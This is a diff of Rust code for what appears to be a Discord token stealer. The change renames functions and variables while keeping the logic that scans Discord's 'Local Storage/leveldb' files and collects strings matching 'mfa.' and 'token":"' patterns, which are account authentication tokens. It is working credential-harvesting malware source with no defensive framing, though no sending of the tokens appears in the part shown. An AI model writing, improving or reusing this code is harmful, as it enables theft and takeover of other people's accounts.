@@ -16,8 +16,9 @@ fn get_discord_paths() -> Vec<PathBuf> {
     paths
 }
 
-fn extract_tokens_from_content(content: &str, tokens: &mut Vec<String>) {
+fn extract_tokens(content: &str, tokens: &mut Vec<String>) {
     let patterns = ["mfa.", "token\":\""];
+
     for pattern in &patterns {
         let mut start = 0;
         while let Some(pos) = content[start..].find(pattern) {
@@ -34,21 +35,23 @@ fn extract_tokens_from_content(content: &str, tokens: &mut Vec<String>) {
 }
 
 pub fn grab_tokens() -> Vec<String> {
-    let mut all_tokens = Vec::new();
+    let mut all = Vec::new();
+
     for path in get_discord_paths() {
         let leveldb = path.join("Local Storage").join("leveldb");
         if !leveldb.exists() {
             continue;
         }
+
         if let Ok(entries) = fs::read_dir(&leveldb) {
             for entry in entries.flatten() {
-                let file_path = entry.path();
-                if let Ok(content) = fs::read(&file_path) {
-                    let content_str = String::from_utf8_lossy(&content);
-                    extract_tokens_from_content(&content_str, &mut all_tokens);
+                if let Ok(content) = fs::read(entry.path()) {
+                    let s = String::from_utf8_lossy(&content);
+                    extract_tokens(&s, &mut all);
                 }
             }
         }
     }
-    all_tokens
+
+    all
 }
